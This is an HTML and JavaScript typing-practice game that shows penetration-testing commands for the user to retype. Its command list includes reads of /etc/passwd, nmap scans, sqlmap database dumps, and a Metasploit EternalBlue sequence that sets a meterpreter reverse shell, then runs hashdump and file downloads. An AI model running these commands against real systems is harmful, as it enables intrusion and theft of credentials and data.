<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<title>Cyber Typing Trainer</title>
<style>
body{
  background:#0b0f14;
  color:#00ff9c;
  font-family:monospace;
  display:flex;
  justify-content:center;
  align-items:center;
  height:100vh;
  margin:0;
}
.app{
  width:800px;
  background:#111;
  padding:25px;
  border-radius:14px;
}
h1{text-align:center;margin:0 0 10px;}
.controls{display:flex;gap:10px;}
select,button,input{
  flex:1;
  padding:10px;
  background:#000;
  color:#00ff9c;
  border:1px solid #333;
}
.command{
  margin-top:20px;
  font-size:18px;
  line-height:1.6;
  word-wrap:break-word;
}
.correct{color:#00ff00;}
.wrong{color:#ff4c4c;}
.pending{color:#555;}
.stats{margin-top:10px;font-size:14px;}
.progress{
  margin-top:10px;
  height:8px;
  background:#222;
  border-radius:6px;
  overflow:hidden;
}
.bar{height:100%;width:0%;background:#00c8ff;}
</style>
</head>
<body>

<div class="app">
<h1>Cyber Typing Trainer</h1>

<div class="controls">
<select id="tool">
  <option value="linux">Linux Basics</option>
  <option value="nmap">Nmap</option>
  <option value="sqlmap">SQLmap</option>
  <option value="metasploit">Metasploit</option>
</select>

<button id="skipBtn">Skip</button>
<button id="resetBtn">Restart</button>
</div>

<div class="command" id="command"></div>
<input id="input" placeholder="Type the command exactly..." autocomplete="off">
<div class="progress"><div class="bar" id="bar"></div></div>
<div class="stats" id="stats"></div>
</div>

<script>
/* ===== COMMAND DATABASE ===== */
const commands = {
linux:[
  "whoami","id","pwd","ls -la","cd /var/www/html","cat /etc/passwd",
  "history | tail","ps aux","df -h","du -sh *","chmod +x exploit.sh","sudo -l"
],

nmap:[
  "nmap 192.168.1.1","nmap -sS 192.168.1.1","nmap -sV 192.168.1.1",
  "nmap -A 192.168.1.1","nmap -p 22,80,443 192.168.1.1",
  "nmap -p- 192.168.1.1",
  "nmap -sS -sV -O -p 1-65535 192.168.1.1",
  "nmap --script vuln 192.168.1.1","nmap -T4 -Pn 192.168.1.1",
  "nmap -oN scan.txt 192.168.1.1"
],

sqlmap:[
  "sqlmap -u http://site.com/index.php?id=1",
  "sqlmap -u http://site.com/index.php?id=1 --dbs",
  "sqlmap -u http://site.com/index.php?id=1 --tables",
  "sqlmap -u http://site.com/index.php?id=1 --columns",
  "sqlmap -u http://site.com/index.php?id=1 --dump",
  "sqlmap -u http://site.com/index.php?id=1 --batch",
  "sqlmap -u http://site.com/index.php?id=1 --risk=3 --level=5",
  "sqlmap -r request.txt",
  "sqlmap -r request.txt --dbs",
  "sqlmap -r request.txt --dump",
  "sqlmap --tamper=space2comment -u http://site.com/index.php?id=1"
],

metasploit:[
  "msfconsole",
  "help",
  "search smb",
  "use exploit/windows/smb/ms17_010_eternalblue",
  "info",
  "show options",
  "show payloads",
  "set RHOSTS 192.168.1.10",
  "set RPORT 445",
  "set LHOST 192.168.1.5",
  "set LPORT 4444",
  "set PAYLOAD windows/x64/meterpreter/reverse_tcp",
  "exploit",
  "run",
  "sessions",
  "sessions -i 1",
  "background",
  "sysinfo",
  "getuid",
  "ps",
  "shell",
  "pwd",
  "ls",
  "upload file.txt",
  "download secret.txt",
  "screenshot",
  "hashdump"
]
};

/* ===== CORE LOGIC (stable + locked) ===== */
let target="", typed="";
let done=0, total=15, errors=0;
let locked=false;

function pickCommand(){
  const tool=document.getElementById("tool").value;
  const list=commands[tool];
  return list[Math.floor(Math.random()*list.length)];
}

function render(){
  let html="";
  for(let i=0;i<target.length;i++){
    if(i<typed.length){
      html+= typed[i]===target[i]
        ? `<span class="correct">${target[i]}</span>`
        : `<span class="wrong">${target[i]}</span>`;
    }else{
      html+= `<span class="pending">${target[i]}</span>`;
    }
  }
  document.getElementById("command").innerHTML=html;
}

function nextCommand(){
  locked=false;
  target=pickCommand();
  typed="";
  document.getElementById("input").value="";
  render();
  document.getElementById("bar").style.width=`${(done/total)*100}%`;
}

document.getElementById("input").addEventListener("input",e=>{
  if(locked) return;
  typed=e.target.value;
  render();
  if(!target.startsWith(typed)) errors++;
  if(typed===target){
    locked=true;
    done++;
    if(done>=total){
      document.getElementById("stats").innerHTML=
        `✔ Session Complete | Accuracy ${Math.max(0,100-errors)}%`;
      return;
    }
    setTimeout(nextCommand,500);
  }
});

document.getElementById("skipBtn").onclick=()=>{
  if(locked) return;
  locked=true;
  done++;
  errors+=target.length;
  nextCommand();
};

document.getElementById("resetBtn").onclick=()=>{
  done=0; errors=0; locked=false;
  document.getElementById("bar").style.width="0%";
  document.getElementById("stats").textContent="";
  nextCommand();
};

document.getElementById("tool").onchange=()=>{
  done=0; errors=0; locked=false;
  document.getElementById("bar").style.width="0%";
  document.getElementById("stats").textContent="";
  nextCommand();
};

nextCommand();
</script>

</body>
</html>
